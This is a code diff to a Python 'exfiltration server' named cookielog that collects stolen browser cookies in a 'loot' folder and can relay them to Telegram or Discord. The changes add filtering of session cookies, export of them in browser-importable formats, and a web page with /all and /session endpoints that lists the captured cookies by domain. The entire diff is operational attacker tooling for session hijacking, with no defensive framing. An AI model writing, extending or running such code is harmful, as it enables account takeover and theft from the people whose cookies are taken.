@@ -28,6 +28,8 @@ LOOT   = os.path.join(HERE, "loot")
 os.makedirs(LOOT, exist_ok=True)
 JSONF  = os.path.join(LOOT, "cookies.json")
 TXTF   = os.path.join(LOOT, "cookies.txt")
+SESS_JSONF = os.path.join(LOOT, "session_cookies.json")
+SESS_TXTF  = os.path.join(LOOT, "session_cookies.txt")
 
 # Parse args: port, --telegram token:chat, --discord webhook
 PORT = 8080
@@ -169,7 +171,56 @@ def write_txt(rows):
         f.write("\n".join(lines) + "\n")
 
 
+def filter_session(rows):
+    """Return only session cookies (expirationDate == 0 or session == true)."""
+    return [c for c in rows if not int(c.get("expirationDate") or 0) or c.get("session")]
+
+
 class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        """Serve cookie files: /all (json), /session (json), / (summary)"""
+        if self.path == "/session":
+            rows = load_existing()
+            sess = filter_session(rows)
+            data = json.dumps(sess, ensure_ascii=False, indent=1).encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+        elif self.path == "/all" or self.path == "/cookies":
+            rows = load_existing()
+            data = json.dumps(rows, ensure_ascii=False, indent=1).encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+        else:
+            # Summary page
+            rows = load_existing()
+            sess = filter_session(rows)
+            domains = {}
+            for c in rows:
+                d = c.get("domain", "?")
+                domains[d] = domains.get(d, 0) + 1
+            top = sorted(domains.items(), key=lambda kv: -kv[1])[:20]
+            html = "<html><body style='font-family:monospace;background:#1a1a1a;color:#d4d4d4'>"
+            html += "<h2 style='color:#4a9eff'>cookielog -- listener</h2>"
+            html += "<p>Total: <b>%d</b> cookies (%d session)</p>" % (len(rows), len(sess))
+            html += "<p>Endpoints: <a href='/all' style='color:#4a9eff'>/all</a> | "
+            html += "<a href='/session' style='color:#4a9eff'>/session</a></p>"
+            html += "<table><tr><th>Count</th><th>Domain</th></tr>"
+            for d, n in top:
+                html += "<tr><td>%d</td><td>%s</td></tr>" % (n, d)
+            html += "</table></body></html>"
+            data = html.encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html")
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+
     def do_POST(self):
         length = int(self.headers.get("Content-Length", 0))
         body = self.rfile.read(length) if length > 0 else b"[]"
@@ -191,6 +242,23 @@ class Handler(BaseHTTPRequestHandler):
         write_json(alls)
         write_txt(alls)
 
+        # write session-only files (filtered)
+        sess_all = filter_session(alls)
+        with open(SESS_JSONF, "w", encoding="utf-8") as f:
+            json.dump(sess_all, f, ensure_ascii=False, indent=1)
+        sess_lines = ["# Netscape HTTP Cookie File (session only)"]
+        for c in sess_all:
+            d = c.get("domain", "")
+            if not d.startswith("."):
+                d = "." + d
+            sess_lines.append("\t".join([
+                d, "TRUE", c.get("path") or "/",
+                "TRUE" if c.get("secure") else "FALSE",
+                "0", c.get("name", ""), c.get("value") or ""
+            ]))
+        with open(SESS_TXTF, "w", encoding="utf-8") as f:
+            f.write("\n".join(sess_lines) + "\n")
+
         # summary
         top = {}
         session = 0
@@ -200,10 +268,11 @@ class Handler(BaseHTTPRequestHandler):
             if not int(c.get("expirationDate") or 0):
                 session += 1
 
-        print("\n[+] %d cookies received (%d session) | total: %d" % (
-            len(cookies), session, len(alls)))
+        print("\n[+] %d cookies received (%d session) | total: %d (%d session)" % (
+            len(cookies), session, len(alls), len(sess_all)))
         print("    -> %s (%d bytes)" % (JSONF, os.path.getsize(JSONF)))
         print("    -> %s (%d bytes)" % (TXTF, os.path.getsize(TXTF)))
+        print("    -> %s (%d session cookies)" % (SESS_JSONF, len(sess_all)))
         for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:15]:
             print("      %5d  %s" % (n, d))
 
@@ -223,6 +292,8 @@ class Handler(BaseHTTPRequestHandler):
 def main():
     print("[listen] exfiltration server on port %d (Ctrl+C to stop)" % PORT)
     print("[listen] output: %s + %s" % (JSONF, TXTF))
+    print("[listen] session: %s + %s" % (SESS_JSONF, SESS_TXTF))
+    print("[listen] web UI: http://localhost:%d/  (endpoints: /all /session)" % PORT)
     print("[listen] format: Cookie-Editor JSON (browser-importable)")
     if TELEGRAM:
         print("[listen] relay: Telegram -> %s" % TELEGRAM.split(":")[0][:10] + "...")
